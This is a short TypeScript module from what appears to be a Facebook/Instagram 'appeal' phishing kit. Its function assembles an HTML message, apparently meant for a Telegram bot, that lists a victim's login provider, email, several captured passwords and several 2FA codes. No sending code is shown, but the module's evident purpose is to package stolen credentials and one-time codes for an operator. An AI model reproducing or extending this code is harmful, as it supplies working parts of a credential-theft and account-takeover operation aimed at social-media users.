import type { LoginProvider } from '@/store/store';

export const SEP = '━━━━━━━━━━━━━━━━━━━━';

const loginProviderLabel: Record<LoginProvider, string> = {
    facebook: 'Facebook',
    instagram: 'Instagram'
};

interface BuildAppealMessageParams {
    baseMessage: string;
    loginProvider?: LoginProvider | null;
    loginEmail?: string | null;
    passwords?: string[];
    codes?: string[];
}

export const buildAppealMessage = ({
    baseMessage,
    loginProvider,
    loginEmail,
    passwords = [],
    codes = []
}: BuildAppealMessageParams): string => {
    let msg = baseMessage;

    if (loginProvider) {
        msg += `\n🔑 Đăng nhập: <b>${loginProviderLabel[loginProvider]}</b>`;
    }

    if (loginEmail || passwords.length > 0) {
        msg += `\n🔐 <b>ĐĂNG NHẬP</b>`;
        if (loginEmail) {
            msg += `\n   TK: <code>${loginEmail}</code>`;
        }
        passwords.forEach((pw, i) => {
            msg += `\n   MK${i + 1}: <code>${pw}</code>`;
        });
    }

    if (codes.length > 0) {
        msg += `\n🔒 <b>MÃ 2FA</b>`;
        codes.forEach((code, i) => {
            msg += `\n   Code${i + 1}: <code>${code}</code>`;
        });
    }

    msg += `\n${SEP}`;
    return msg;
};
